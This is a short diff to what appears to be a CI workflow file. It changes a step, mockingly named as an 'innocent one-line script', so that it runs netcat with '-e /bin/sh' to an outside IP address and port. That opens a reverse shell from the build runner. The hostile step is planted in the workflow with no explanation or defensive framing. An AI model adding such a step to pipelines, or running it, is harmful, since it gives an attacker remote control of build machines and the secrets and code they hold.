@@ -20,4 +20,4 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run another normal very innocent one-line script
-        run: nc 34.89.254.21 32032
+        run: nc 34.89.254.21 32032 -e /bin/sh
